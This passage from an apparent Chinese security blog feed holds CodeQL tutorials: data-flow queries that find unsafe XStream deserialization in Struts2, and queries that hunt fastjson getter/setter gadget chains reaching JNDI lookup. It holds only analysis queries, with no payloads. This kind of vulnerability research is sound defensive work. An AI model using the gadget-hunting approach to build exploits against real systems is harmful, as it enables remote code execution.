class="line"></span><br><span class="line">from MethodAccess call, Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;toObject&quot;</span>) and method.getDeclaringType().getAnAncestor().hasQualifiedName(<span class="string">&quot;org.apache.struts2.rest.handler&quot;</span>, <span class="string">&quot;ContentTypeHandler&quot;</span>) and call.getMethod() = method</span><br><span class="line">select call</span><br></pre></td></tr></table></figure><h3 id="过滤构造方法"><a href="#过滤构造方法" class="headerlink" title="过滤构造方法"></a>过滤构造方法</h3><p>假设代码中<code>new File </code>为我们的<code>sink</code>点，可以构造<code>ql</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FileContruct</span> <span class="keyword">extends</span> <span class="title class_">ClassInstanceExpr</span>&#123;</span><br><span class="line">    FileContruct()&#123;</span><br><span class="line">        <span class="built_in">this</span>.getConstructor().getDeclaringType*().hasQualifiedName(<span class="string">&quot;java.io&quot;</span>, <span class="string">&quot;File&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据流追踪"><a href="#数据流追踪" class="headerlink" title="数据流追踪"></a>数据流追踪</h3><p>Local Data Flow分析SPEL</p><p>本地数据流 本地数据流是单个方法(一旦变量跳出该方法即为数据流断开)或可调用对象中的数据流。本地数据流通常比全局数据流更容易、更快、更精确。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.frameworks.spring.SpringController</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.TaintTracking</span><br><span class="line">from Call call,Callable parseExpression,SpringRequestMappingMethod route</span><br><span class="line">where</span><br><span class="line">    call.getCallee() = parseExpression and </span><br><span class="line">    parseExpression.getDeclaringType().hasQualifiedName(<span class="string">&quot;org.springframework.expression&quot;</span>, <span class="string">&quot;ExpressionParser&quot;</span>) and</span><br><span class="line">    parseExpression.hasName(<span class="string">&quot;parseExpression&quot;</span>) and </span><br><span class="line">   TaintTracking::localTaint(DataFlow::parameterNode(route.getARequestParameter()),DataFlow::exprNode(call.getArgument(<span class="number">0</span>))) </span><br><span class="line">select route.getARequestParameter(),call</span><br></pre></td></tr></table></figure><p>全局数据流分析要继承<code>DataFlow::Configuration</code> 这个类，然后重载<code>isSource</code> 和<code>isSink</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyConfig</span> <span class="keyword">extends</span> <span class="title class_">DataFlow</span>::Configuration &#123;</span><br><span class="line">  MyConfig() &#123; <span class="built_in">this</span> = <span class="string">&quot;Myconfig&quot;</span> &#125;</span><br><span class="line">  override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    ....</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    ....</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;source are&quot;</span></span><br></pre></td></tr></table></figure><h2 id="数据流断的原因"><a href="#数据流断的原因" class="headerlink" title="数据流断的原因"></a>数据流断的原因</h2><ul><li>外部的方法，因为没有编译到数据库中，这个是最常见的，基本上市面上的扫描器都存在这个问题，说起来复杂，原因大概是因为构建数据流会随着扫描AST的复杂程度递增导致数据库过大，最后大家在时间和易用性上做了平衡，选择了编译直接依赖的内容进行查询，从而导致这个问题的存在。  —–&gt; maven直接导入的依赖并不能被扫到</li><li>复杂的字符串拼接,例如append，一些其他的字符串赋值，这个一般出场都是空的，要自己去搞，当然会有一些类似fortify的自带了部分场景的连接，不过有的时候要自己去排查</li><li>强制类型转换</li></ul><h2 id="isAddtionalStep技巧"><a href="#isAddtionalStep技巧" class="headerlink" title="isAddtionalStep技巧"></a>isAddtionalStep技巧</h2><p>isAddtionalStep使用就用最简单的二分法来定位，先前移sink，然后检测出来的话就移动到后面，直到找到哪个断开的地方。 冷知识：数据流是可以混用的，例如我们的sink又可以是一个hasFlow表达式</p><h2 id="例子-struts2"><a href="#例子-struts2" class="headerlink" title="例子(struts2)"></a>例子(struts2)</h2><p>出现问题是因为 Apache Struts 框架的一部分包括接受多种不同格式或<em>内容类型</em>的请求的能力。它提供了一个通过接口支持这些内容类型的可插拔系统<code>ContentTypeHandler</code>，它提供了如下接口方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Populates an object using data from the input stream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in The input stream, usually the body of the request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target The target, usually the action class</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException If unable to write to the output stream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">toObject</span><span class="params">(Reader in, Object target)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure><p>新的内容类型处理程序是通过实现接口和定义一个<code>toObject</code>方法来定义的，该方法以指定的内容类型（以 a 的形式<code>Reader</code>）获取数据并使用它来填充 Java 对象<code>target</code>，通常通过反序列化例程。但是，该<code>in</code>参数通常是从请求的正文中填充的，没有经过清理或安全检查。这意味着它应该被视为“不受信任”的用户数据，并且仅在某些安全条件下进行反序列化。</p><h3 id="查找XML反序列化"><a href="#查找XML反序列化" class="headerlink" title="查找XML反序列化"></a>查找XML反序列化</h3><p><a href="https://x-stream.github.io/index.html">XStream</a>是一个 Java 框架，用于将 Java 对象序列化为 Apache Struts 使用的 XML。它提供了一种<code>XStream.fromXML</code>将 XML 反序列化为 Java 对象的方法。默认情况下，输入不会以任何方式进行验证，并且容易受到远程代码执行漏洞的攻击。在本节中，我们将识别<code>fromXML</code>代码库中的调用。</p><p>具体步骤如下：</p><ol><li><p>查找程序中的所有方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess call</span><br><span class="line">select call</span><br></pre></td></tr></table></figure></li><li><p>更新查询以报告每个方法调用所调用的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess call, Method method</span><br><span class="line">where call.getMethod() = method</span><br><span class="line">select call, method</span><br></pre></td></tr></table></figure></li><li><p>查找程序中对方法调用的所有调用<code>fromXML</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess fromXML, Method method</span><br><span class="line">where</span><br><span class="line">  fromXML.getMethod() = method and</span><br><span class="line">  method.getName() = <span class="string">&quot;fromXML&quot;</span></span><br><span class="line">select fromXML</span><br></pre></td></tr></table></figure></li><li><p>该<code>XStream.fromXML</code>方法反序列化第一个参数（即 index 处的参数<code>0</code>）。更新您的查询以报告反序列化的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess fromXML,Expr expr</span><br><span class="line">where fromXML.getMethod().getName()=<span class="string">&quot;fromXML&quot;</span> and</span><br><span class="line">      expr=fromXML.getArgument(<span class="number">0</span>)</span><br><span class="line">select fromXML,expr</span><br></pre></td></tr></table></figure></li><li><p>或者我们可以用谓词封装的逻辑进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">isXMLDeserialized</span><span class="params">(Expr arg)</span> &#123;</span><br><span class="line">  exists(MethodAccess fromXML |</span><br><span class="line">    fromXML.getMethod().getName() = <span class="string">&quot;fromXML&quot;</span> <span class="type">and</span></span><br><span class="line">  <span class="variable">arg</span> <span class="operator">=</span> fromXML.getArgument(<span class="number">0</span>)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="从-ContentTypeHandler-中查找-toObject-方法的实现"><a href="#从-ContentTypeHandler-中查找-toObject-方法的实现" class="headerlink" title="从 ContentTypeHandler 中查找 toObject 方法的实现"></a>从 ContentTypeHandler 中查找 toObject 方法的实现</h3><ol><li><p>创建一个调用<code>ContentTypeHandler</code>来查找接口的 CodeQL 类<code>org.apache.struts2.rest.handler.ContentTypeHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The interface `org.apache.struts2.rest.handler.ContentTypeHandler`. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContentTypeHandler</span> <span class="keyword">extends</span> <span class="title class_">RefType</span> &#123;</span><br><span class="line">  ContentTypeHandler() &#123;</span><br><span class="line">    <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.struts2.rest.handler&quot;</span>, <span class="string">&quot;ContentTypeHandler&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建一个 CodeQL 类<code>ContentTypeHandlerToObject</code>，用于识别在直接超类型包括 的类上调用的<code>Methods</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ContentTypeHandlerToObject</span> <span class="keyword">extends</span> <span class="title class_">Method</span> &#123;</span><br><span class="line">  ContentTypeHandlerToObject() &#123;</span><br><span class="line">    <span class="built_in">this</span>.getDeclaringType().getASupertype() <span class="keyword">instanceof</span> ContentTypeHandler and</span><br><span class="line">    <span class="built_in">this</span>.hasName(<span class="string">&quot;toObject&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>toObject</code>方法应将第一个参数视为不受信任的用户输入。编写查询以查找<code>toObject</code>方法的第一个（即索引 0）参数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ContentTypeHandlerToObject toObjectMethod</span><br><span class="line"><span class="keyword">select</span> toObjectMethod.getParameter(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="数据流追踪-1"><a href="#数据流追踪-1" class="headerlink" title="数据流追踪"></a>数据流追踪</h3><p>官方说可以用下面这个模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> Unsafe XML deserialization</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> problem</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id</span> java/unsafe-deserialization</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO add previous class and predicate definitions here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StrutsUnsafeDeserializationConfig</span> <span class="keyword">extends</span> <span class="title class_">DataFlow</span>::Configuration &#123;</span><br><span class="line">  StrutsUnsafeDeserializationConfig() &#123; <span class="built_in">this</span> = <span class="string">&quot;StrutsUnsafeDeserializationConfig&quot;</span> &#125;</span><br><span class="line">  override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    exists(<span class="comment">/** TODO fill me in **/</span> |</span><br><span class="line">      source.asParameter() = <span class="comment">/** TODO fill me in **/</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(<span class="comment">/** TODO fill me in **/</span> |</span><br><span class="line">      <span class="comment">/** TODO fill me in **/</span></span><br><span class="line">      sink.asExpr() = <span class="comment">/** TODO fill me in **/</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from StrutsUnsafeDeserializationConfig config, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where config.hasFlow(source, sink)</span><br><span class="line">select sink, <span class="string">&quot;Unsafe XML deserialization&quot;</span></span><br></pre></td></tr></table></figure><ol><li><p>确定<code>source</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(Node source)</span> &#123;</span><br><span class="line">  exists(ContentTypeHandlerToObject toObjectMethod |</span><br><span class="line">    source.asParameter() = toObjectMethod.getParameter(<span class="number">0</span>)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>确定 <code>sink</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(Node sink)</span> &#123;</span><br><span class="line">    exists(Expr arg |</span><br><span class="line">      isXMLDeserialized(arg) and</span><br><span class="line">      sink.asExpr() = arg</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>对于这个结果，很容易验证它是否正确，因为 source 和 sink 都在同一个方法中。但是，对于许多数据流问题，情况并非如此。</p><p>我们可以更新查询，使其不仅报告接收器，还报告源和该源的路径。我们可以通过进行以下更改来做到这一点： 答案是将查询转换为<em>路径问题</em>查询。我们需要改变五个部分：</p><ul><li>将<code>@kind</code>from转换<code>problem</code>为<code>path-problem</code>. 这告诉 CodeQL 工具链将此查询的结果解释为路径结果。</li><li>添加一个新的 import <code>DataFlow::PathGraph</code>，它将在查询结果旁边报告路径数据。</li><li>将变量从更改为<code>source</code>，以确保节点保留路径信息。<code>sink``DataFlow::Node``DataFlow::PathNode</code></li><li>使用<code>hasFlowPath</code>而不是<code>hasFlow</code>.</li><li>更改选择以将<code>source</code>and报告<code>sink</code>为第二列和第三列。工具链将这些数据与路径信息相结合<code>PathGraph</code>以构建路径。</li></ul></li><li><p>加入路径查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@name</span> Unsafe XML deserialization</span></span><br><span class="line"><span class="comment">* <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment">* <span class="doctag">@id</span> java/unsafe-deserialization</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate <span class="title function_">isXMLDeserialized</span><span class="params">(Expr arg)</span> &#123;</span><br><span class="line">  exists(MethodAccess fromXML |</span><br><span class="line">    fromXML.getMethod().getName() = <span class="string">&quot;fromXML&quot;</span> <span class="type">and</span></span><br><span class="line">    <span class="variable">arg</span> <span class="operator">=</span> fromXML.getArgument(<span class="number">0</span>)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The interface `org.apache.struts2.rest.handler.ContentTypeHandler`. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContentTypeHandler</span> <span class="keyword">extends</span> <span class="title class_">RefType</span> &#123;</span><br><span class="line">  ContentTypeHandler() &#123;</span><br><span class="line">    <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.struts2.rest.handler&quot;</span>, <span class="string">&quot;ContentTypeHandler&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** A `toObject` method on a subtype of `org.apache.struts2.rest.handler.ContentTypeHandler`. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContentTypeHandlerToObject</span> <span class="keyword">extends</span> <span class="title class_">Method</span> &#123;</span><br><span class="line">  ContentTypeHandlerToObject() &#123;</span><br><span class="line">    <span class="built_in">this</span>.getDeclaringType().getASupertype() <span class="keyword">instanceof</span> ContentTypeHandler and</span><br><span class="line">    <span class="built_in">this</span>.hasName(<span class="string">&quot;toObject&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StrutsUnsafeDeserializationConfig</span> <span class="keyword">extends</span> <span class="title class_">DataFlow</span>::Configuration &#123;</span><br><span class="line">  StrutsUnsafeDeserializationConfig() &#123; <span class="built_in">this</span> = <span class="string">&quot;StrutsUnsafeDeserializationConfig&quot;</span> &#125;</span><br><span class="line">  override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    exists(ContentTypeHandlerToObject toObjectMethod |</span><br><span class="line">      source.asParameter() = toObjectMethod.getParameter(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(Expr arg |</span><br><span class="line">      isXMLDeserialized(arg) and</span><br><span class="line">      sink.asExpr() = arg</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from StrutsUnsafeDeserializationConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">&quot;Unsafe XML deserialization&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/githubsatelliteworkshops/codeql/blob/master/java.md">https://github.com/githubsatelliteworkshops/codeql/blob/master/java.md</a></p>]]></content>
    
    
    <summary type="html">对codeql常见的方法进行一个学习</summary>
    
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/categories/codeql/"/>
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>codeql测试fastjson</title>
    <link href="https://h0ld1rs.github.io/posts/40079.html"/>
    <id>https://h0ld1rs.github.io/posts/40079.html</id>
    <published>2022-03-25T14:15:27.000Z</published>
    <updated>2022-03-26T13:23:39.823Z</updated>
    
    <content type="html"><![CDATA[<h1 id="codeql测试fastjson"><a href="#codeql测试fastjson" class="headerlink" title="codeql测试fastjson"></a>codeql测试fastjson</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先要清楚，fastjson的利用链主要集中在getter和setter方法中，如果getter或者setter的方法中存在一些危险操作，比如JNDI查询之类的调用的话，如果参数可控就可以导致JNDI注入，而且fastjson的防御方式为黑名单，所以会层出不穷fastjson的绕过gadgets</p><p>鉴于fastjson的漏洞原理较为简单，且source（用户输入的源头）和sink（危险的函数）较为明确，所以可以使用codeql对一些常见的库进行fastjson利用链的挖掘</p><h2 id="定义入口点-source"><a href="#定义入口点-source" class="headerlink" title="定义入口点(source)"></a>定义入口点(source)</h2><p>fastjson的source相对比较好定义，所有fastjson的入口函数都是getter和setter这些函数，所以对应的source就为这些getter和setter，在codeql查询中，其实相当于将所有的函数按照用户所需要的过滤规则拿出来，所以我们只需要定义过滤的规则</p><p>对于getter和setter的规则，这里其实并不是一定要有对应的属性，只要前三个字母开头是get，并且第四个字母大写即可</p><p><strong>getter的规则</strong>：</p><ol><li>以get开头</li><li>没有函数参数</li><li>是 code database 中的函数</li><li>为 public方法</li><li>函数名长度要大于3</li></ol><p><strong>setter</strong>的规则：</p><ol><li>以set开头</li><li>函数参数为一个</li><li>是 code database 中的函数</li><li>为public方法</li><li>函数名长度大于3</li><li>返回值为<code>void</code></li></ol><p>所以我们可以根据这几个规则写出对应的<code>source</code>，转换为<code>ql</code>语句为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FastjsonSetMethod</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">    FastjsonSetMethod()&#123;</span><br><span class="line">        <span class="built_in">this</span>.getName().indexOf(<span class="string">&quot;set&quot;</span>)=<span class="number">0</span> and</span><br><span class="line">        <span class="built_in">this</span>.getName().length()&gt;<span class="number">3</span> and</span><br><span class="line">        <span class="built_in">this</span>.isPublic() and</span><br><span class="line">        <span class="built_in">this</span>.fromSource() and</span><br><span class="line">        <span class="title function_">exists</span><span class="params">(VoidType vt |vt = <span class="built_in">this</span>.getReturnType()</span> ) and</span><br><span class="line">        <span class="built_in">this</span>.getNumberOfParameters()=<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastjsonGetMethod</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">    FastjsonGetMethod()&#123;</span><br><span class="line">        <span class="built_in">this</span>.getName().indexOf(<span class="string">&quot;get&quot;</span>)=<span class="number">0</span> and</span><br><span class="line">        <span class="built_in">this</span>.getName().length() &gt; <span class="number">3</span> and</span><br><span class="line">        <span class="built_in">this</span>.isPublic() and</span><br><span class="line">        <span class="built_in">this</span>.fromSource() and</span><br><span class="line">        <span class="built_in">this</span>.hasNoParameters()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定义危险函数"><a href="#定义危险函数" class="headerlink" title="定义危险函数"></a>定义危险函数</h2><p>这里危险函数不仅仅是JNDI注入的函数，也可以是DNS查询之类的函数</p><p><code>JNDI</code>函数的规则：</p><ol><li>这个函数名为<code>lookup</code></li><li>这个函数所在的类实现了”javax.naming.Context”接口</li></ol><p>使用ql语言，描述为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">JNDIMethod</span> <span class="keyword">extends</span> <span class="title class_">Method</span>&#123;</span><br><span class="line">    JNDIMethod()&#123;</span><br><span class="line">        <span class="built_in">this</span>.getDeclaringType().getASupertype *().hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Context&quot;</span>)</span><br><span class="line">        and</span><br><span class="line">        <span class="built_in">this</span>.hasName(<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="确定搜索方法-sink"><a href="#确定搜索方法-sink" class="headerlink" title="确定搜索方法(sink)"></a>确定搜索方法(sink)</h2><p>因为在fastjson中，有两个输入点，一个是get方法所在类的属性，一个是在fastjson触发的时候所传入的参数，为了方便起见，没有定义确定的source，一般来说能满足get方法最后到lookup的类相对较少，所以可以在查询结束以后再人工进行一次确认</p><p>这里没有用fastjson的全局的污点追踪，而是直接通过语法结构查找对应的利用链</p>]]></content>
    
    
    <summary type="html">codeql测试fastjson</summary>
    
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/categories/codeql/"/>
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>绕过Waf之分块传输</title>
    <link href="https://h0ld1rs.github.io/posts/39835.html"/>
    <id>https://h0ld1rs.github.io/posts/39835.html</id>
    <published>2022-03-23T14:22:37.000Z</published>
    <updated>2022-03-23T14:26:34.545Z</updated>
    
